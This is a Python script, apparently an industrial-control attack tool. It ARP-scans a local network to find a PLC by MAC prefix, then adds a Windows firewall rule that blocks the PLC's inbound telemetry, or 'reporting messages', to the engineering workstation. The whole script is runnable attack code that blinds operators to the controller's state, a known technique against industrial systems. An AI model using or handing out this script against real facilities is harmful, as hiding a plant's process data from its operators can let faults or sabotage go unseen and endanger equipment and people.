import os
import re
import subprocess
from scapy.all import ARP, Ether, srp

def find_plc_ip(network_range="192.168.1.0/24"):
    """Scans the local network to find the PLC's IP address."""
    print("[*] Scanning network to find PLC...")

    # ARP request to all devices in the network range
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=network_range), timeout=2, verbose=False)
    
    for sent, received in ans:
        ip = received.psrc
        mac = received.hwsrc

        # Add logic to identify the PLC if specific MAC rules apply
        print(f"[*] Found device at IP: {ip}, MAC: {mac}")

        # Placeholder: Assuming the PLC has a known MAC prefix or identifying factor
        if "00:1A:2B" in mac:  # Replace with actual MAC vendor prefix if known
            print(f"[+] Identified PLC at {ip}")
            return ip

    print("[!] PLC not found.")
    return None

def block_plc_traffic(plc_ip):
    """Blocks communication between the PLC and the engineering workstation."""
    print(f"[*] Blocking reporting messages from PLC at {plc_ip}...")

    # Adding a firewall rule to block traffic from the PLC
    rule_name = "Block_PLC_Telemetry"
    cmd = f'netsh advfirewall firewall add rule name="{rule_name}" dir=in action=block remoteip={plc_ip}'
    
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    if "Ok." in result.stdout:
        print(f"[+] Successfully blocked reporting messages from {plc_ip}")
    else:
        print(f"[!] Failed to apply rule: {result.stderr}")

if __name__ == "__main__":
    plc_ip = find_plc_ip()
    if plc_ip:
        block_plc_traffic(plc_ip)
    else:
        print("[!] Exiting... Could not identify PLC.")